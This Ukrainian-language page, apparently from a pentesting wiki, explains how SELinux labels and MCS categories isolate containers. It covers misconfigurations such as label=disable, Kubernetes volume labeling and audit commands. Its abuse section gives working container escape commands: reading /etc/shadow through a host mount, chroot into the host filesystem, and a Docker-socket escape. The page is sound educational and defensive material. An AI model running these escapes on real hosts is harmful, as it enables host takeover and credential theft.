# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

SELinux — це система **Mandatory Access Control на основі міток**. Кожен відповідний процес і об'єкт може мати контекст безпеки, а policy визначає, які домени можуть взаємодіяти з якими типами та яким чином. У containerized environments це зазвичай означає, що runtime запускає процес container у confined container domain і маркує вміст container відповідними типами. Якщо policy працює належним чином, процес може читати й записувати об'єкти, до яких, як очікується, має звертатися його мітка, але отримує відмову в доступі до іншого вмісту host, навіть якщо цей вміст стає видимим через mount.

Це один із найпотужніших захистів на стороні host, доступних у поширених Linux container deployments. Він особливо важливий у Fedora, RHEL, CentOS Stream, OpenShift та інших SELinux-centric ecosystems. У таких середовищах reviewer, який ігнорує SELinux, часто неправильно розуміє, чому очевидний шлях до компрометації host насправді заблокований.

## AppArmor проти SELinux

Найпростіша загальна відмінність полягає в тому, що AppArmor базується на шляхах, тоді як SELinux є **label-based**. Це має значні наслідки для container security. Policy на основі шляхів може поводитися інакше, якщо той самий вміст host стає видимим за несподіваним шляхом mount. Policy на основі міток натомість перевіряє мітку об'єкта та те, що domain процесу дозволено з ним робити. Це не робить SELinux простим, але робить його стійким до певного класу припущень щодо маніпуляцій зі шляхами, які захисники іноді випадково роблять у системах на основі AppArmor.

Оскільки ця модель орієнтована на мітки, обробка container volumes і рішення щодо relabeling є критичними для безпеки. Якщо runtime або оператор надто широко змінює мітки, щоб «змусити mounts працювати», межа policy, яка мала ізолювати workload, може стати значно слабшою, ніж передбачалося.

## Лабораторна робота

Щоб перевірити, чи активний SELinux на host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Щоб перевірити наявні мітки на хості:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Щоб порівняти звичайний запуск із запуском, у якому маркування вимкнено:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
На хості з увімкненим SELinux це дуже практична демонстрація, оскільки вона показує різницю між workload, що працює в очікуваному container domain, і workload, з якого цей enforcement layer було вилучено.

## Використання під час виконання

Podman особливо добре інтегрований із SELinux у системах, де SELinux є частиною стандартної платформи. Rootless Podman разом із SELinux є одним із найнадійніших загальноприйнятих baseline для контейнерів, оскільки процес уже є unprivileged на стороні хоста й додатково обмежується політикою MAC. Docker також може використовувати SELinux там, де це підтримується, хоча адміністратори іноді вимикають його, щоб обійти проблеми з маркуванням volume. CRI-O та OpenShift значною мірою покладаються на SELinux як на частину своєї моделі ізоляції контейнерів. Kubernetes також може надавати налаштування, пов’язані із SELinux, але їхня цінність, очевидно, залежить від того, чи підтримує та фактично застосовує SELinux операційна система вузла.<sup>[[2]](#references)</sup>

Повторюваний висновок полягає в тому, що SELinux — це не необов’язкове доповнення. В екосистемах, побудованих навколо нього, він є частиною очікуваної межі безпеки. Щоб ознайомитися з переліком політик на стороні хоста, аналізом переходів і зловживанням інструментами адміністрування SELinux, дивіться [загальну сторінку SELinux](../../../interesting-files-permissions/selinux.md).

## Категорії MCS та перемаркування volume

Ізоляція контейнерів зазвичай є поєднанням **примусового застосування типів** і **Multi-Category Security (MCS)**. Два процеси можуть працювати як `container_t`, але отримувати різні рівні, наприклад `s0:c123,c456` і `s0:c321,c654`. Вміст приватного контейнера має мітку `container_file_t` із відповідними категоріями, тому самого лише досягнення шляху іншого контейнера недостатньо для доступу до нього. Зазвичай runtimes виділяють пару категорій; навмисне повторне використання рівня вручну руйнує це розділення між окремими контейнерами.<sup>[[3]](#references)</sup>

Порівнюйте мітки процесу та mount, а не перевіряйте лише тип:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Суфікси bind-mount змінюють мітки inode на host і, відповідно, змінюють межу безпеки, а не лише метадані монтування:<sup>[[3]](#references)</sup>

- `:Z` застосовує приватну мітку з категоріями MCS контейнера. Це підходить для тому, яким володіє один контейнер або Pod.
- `:z` застосовує спільну мітку, щоб інші ізольовані контейнери також могли використовувати цей вміст (з урахуванням дозволів DAC). Використання цього параметра для secrets або даних, специфічних для tenant, усуває ізоляцію MCS, яка в іншому разі розділяла б контейнери.
- Перепризначення міток є рекурсивним. Застосування будь-якого з цих параметрів до широких дерев на host, таких як `/`, `/etc`, `/usr` або всього дерева home, може як відкрити вміст вибраному контейнеру, так і зупинити host-сервіси, очікувані мітки яких було замінено.

Повторне використання рівня вручну легко виявити в командних рядках і маніфестах. Наведені нижче два контейнери навмисно отримують однаковий рівень MCS і тому можуть використовувати вміст, позначений для цього рівня:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
Також слід розрізняти `label=nested` і `label=disable`: перше відкриває SELinux operations усередині контейнера та дозволяє змінювати labels лише там, де це дозволяє policy, тоді як друге усуває розділення labels для цього workload. Обидва варіанти потребують перевірки, але вони не є еквівалентними.<sup>[[3]](#references)</sup>

## Misconfigurations

Класична помилка — `label=disable`. На практиці це часто трапляється тому, що в монтуванні volume було відмовлено, і найшвидшою короткостроковою відповіддю стало усунення SELinux із рівняння замість виправлення моделі labeling.<sup>[[1]](#references)</sup> Інша поширена помилка — неправильний relabeling вмісту хоста. Масштабні операції relabeling можуть забезпечити роботу application, але також здатні значно розширити перелік об’єктів, до яких контейнер може отримати доступ, за межі початкового задуму.

Також важливо не плутати **встановлений** SELinux з **ефективним** SELinux. Хост може підтримувати SELinux і водночас працювати в permissive mode, або runtime може запускати workload не в очікуваному domain. У таких випадках захист значно слабший, ніж можна було б припустити з документації.

## Abuse

Коли SELinux відсутній, працює в permissive mode або широко вимкнений для workload, змонтовані шляхи хоста стають значно простішими для abuse. Те саме bind mount, яке за інших умов було б обмежене labels, може перетворитися на прямий шлях до даних хоста або до його модифікації. Це особливо важливо в поєднанні з writable volume mounts, директоріями container runtime або операційними спрощеннями, які задля зручності відкривають доступ до чутливих шляхів хоста.

SELinux часто пояснює, чому типовий breakout writeup одразу спрацьовує на одному хості, але неодноразово зазнає невдачі на іншому, хоча flags runtime виглядають подібно. Відсутнім компонентом часто є не namespace і не capability, а label boundary, яка залишилася неушкодженою.

Найшвидша практична перевірка — порівняти активний context, а потім перевірити змонтовані шляхи хоста або директорії runtime, які зазвичай обмежуються labels:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Якщо присутній host bind mount, а SELinux labeling вимкнено або послаблено, найчастіше спочатку відбувається розкриття інформації:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Якщо монтування доступне для запису, а з погляду ядра контейнер фактично має права root на хості, наступним кроком буде перевірка контрольованої модифікації хоста, а не здогадки:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
На хостах із підтримкою SELinux втрата міток у каталогах стану runtime також може відкрити прямі шляхи до підвищення привілеїв:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ці команди не замінюють повний ланцюжок escape, але дуже швидко показують, чи саме SELinux перешкоджав доступу до даних host або модифікації файлів на стороні host.

### Повний приклад: SELinux вимкнено + доступний для запису mount host

Якщо SELinux labeling вимкнено, а файлова система host змонтована з правом запису в `/host`, повний host escape стає звичайним випадком зловживання bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Якщо `chroot` завершується успішно, процес контейнера тепер працює з файлової системи хоста:
```bash
id
hostname
cat /etc/passwd | tail
```
### Повний приклад: SELinux вимкнено + каталог runtime

Якщо workload може отримати доступ до runtime socket після вимкнення labels, escape можна делегувати runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Важливе спостереження полягає в тому, що SELinux часто був засобом контролю, який запобігав саме такому доступу до шляхів хоста або стану runtime.

## Перевірки

Мета перевірок SELinux — підтвердити, що SELinux увімкнено, визначити поточний контекст безпеки та перевірити, чи файли або шляхи, які вас цікавлять, справді ізольовані за допомогою міток.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Що тут цікаво:

- `getenforce` в ідеалі має повертати `Enforcing`; `Permissive` або `Disabled` змінює значення всього розділу про SELinux.
- Якщо контекст поточного процесу виглядає неочікуваним або надто широким, workload може працювати не за призначеною політикою контейнера.
- Якщо файли, змонтовані з host, або runtime-директорії мають мітки, до яких процес може отримувати надто вільний доступ, bind mounts стають набагато небезпечнішими.

Під час перевірки контейнера на платформі з підтримкою SELinux не вважайте маркування другорядною деталлю. У багатьох випадках саме воно є однією з головних причин, чому host досі не скомпрометований.

## Runtime Defaults

| Runtime / платформа | Стан за замовчуванням | Поведінка за замовчуванням | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Залежить від host | Розділення SELinux доступне на host із підтримкою SELinux, але точна поведінка залежить від конфігурації host/daemon | `--security-opt label=disable`, широке перемаркування bind mounts, `--privileged` |
| Podman | Зазвичай увімкнено на host із SELinux | Розділення SELinux є стандартною частиною Podman у системах із SELinux, якщо його не вимкнено | `--security-opt label=disable`, `label=false` у `containers.conf`, `--privileged` |
| Kubernetes | Призначається runtime на вузлах із SELinux; налаштовується явно | Runtime може призначити унікальну мітку, якщо Pod її не встановлює. Явний `securityContext.seLinuxOptions` керує міткою Pod/volume; у Kubernetes 1.37 відповідні volumes за замовчуванням використовують маркування SELinux під час монтування | дубльовані рівні MCS, вузли в режимі permissive/disabled, надто широкі privileged workloads, безсистемне використання `seLinuxChangePolicy: Recursive` <sup>[[2]](#references)[[4]](#references)</sup> |
| CRI-O / розгортання у стилі OpenShift | Зазвичай активно використовується | У таких середовищах SELinux часто є основною частиною моделі ізоляції вузла | власні політики, що надмірно розширюють доступ, вимкнення маркування для сумісності |

Налаштування SELinux за замовчуванням більше залежать від дистрибутива, ніж налаштування seccomp. У системах на кшталт Fedora/RHEL/OpenShift SELinux часто є центральною частиною моделі ізоляції. У системах без SELinux він просто відсутній.

## Kubernetes 1.37 Volume Labeling

У Kubernetes 1.37 функцію `SELinuxMount` було визнано стабільною та ввімкнено за замовчуванням. Для відповідного PVC, Pod із `seLinuxOptions` і CSI driver, який оголошує `.spec.seLinuxMount: true`, kubelet використовує `-o context=<label>` замість того, щоб просити runtime рекурсивно перемаркувати кожен inode. Драйвери та типи volume, які не підтримуються, і надалі використовують рекурсивний шлях. Це усуває потребу у великому проході перемаркування, а також не змінює постійні мітки кожного файлу лише для того, щоб надати Pod доступ до volume.<sup>[[2]](#references)[[4]](#references)</sup>

Монтування може мати лише один такий контекст. Через це Pods із **різними мітками SELinux**, які використовують один і той самий відповідний volume на одному вузлі, більше не можуть співіснувати за стандартної поведінки `MountOption`: один із них залишається у стані `ContainerCreating` з помилкою `conflicting SELinux labels of volume`. Розглядайте це і як проблему доступності, і як корисну ознаку того, що workloads неявно спільно використовували storage через межі MCS. Якщо таке спільне використання є навмисним — наприклад, privileged Pod із `spc_t` і confined Pod використовують один volume — сумісним обходом для окремого Pod є `seLinuxChangePolicy: Recursive`; не застосовуйте його до всього кластера, не з’ясувавши, які шляхи runtime перемаркує.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
Корисні перевірки на стороні кластера:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
Необов’язковий `kube-controller-manager` `selinux-warning-controller` виявляє Pod, які спільно використовують volume з несумісними мітками, і надає метрику `selinux_warning_controller_selinux_volume_conflict`. Увімкніть і перевірте його перед оновленнями або перед зміною поведінки маркування volume; це допомагає відрізнити справжній конфлікт політик від звичайної помилки CSI або файлової системи.<sup>[[2]](#references)</sup>

## References

- [1] [Документація Podman: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Налаштування Security Context для Pod або Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Документація Podman run: мітки SELinux і повторне маркування volume](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Реліз Kubernetes v1.37: SELinuxMount і SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
